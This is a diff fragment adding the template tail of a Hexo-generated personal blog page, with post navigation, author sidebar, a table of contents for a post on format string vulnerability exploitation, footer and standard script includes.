+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/26/qemu-arm/" rel="next" title="Intel linux调试arm程序">
+                <i class="fa fa-chevron-left"></i> Intel linux调试arm程序
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/31/afl-asan/" rel="prev" title="AFL Fuzzing with ASAN">
+                AFL Fuzzing with ASAN <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">binpang</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/bin2415" title="GitHub &rarr; https://github.com/bin2415" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:pangbin2415@gmail.com" title="E-Mail &rarr; mailto:pangbin2415@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#格式化字符串漏洞"><span class="nav-number">2.</span> <span class="nav-text">格式化字符串漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">3.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修改计数变量"><span class="nav-number">4.1.</span> <span class="nav-text">修改计数变量</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露地址"><span class="nav-number">4.1.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修改栈的内容"><span class="nav-number">4.1.2.</span> <span class="nav-text">修改栈的内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修改MACRO-COUNT的值"><span class="nav-number">4.1.3.</span> <span class="nav-text">修改MACRO_COUNT的值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读写任意内存"><span class="nav-number">4.2.</span> <span class="nav-text">读写任意内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露libc地址"><span class="nav-number">4.2.1.</span> <span class="nav-text">泄露libc地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修改返回地址和参数"><span class="nav-number">4.2.2.</span> <span class="nav-text">修改返回地址和参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">binpang</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v6.6.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
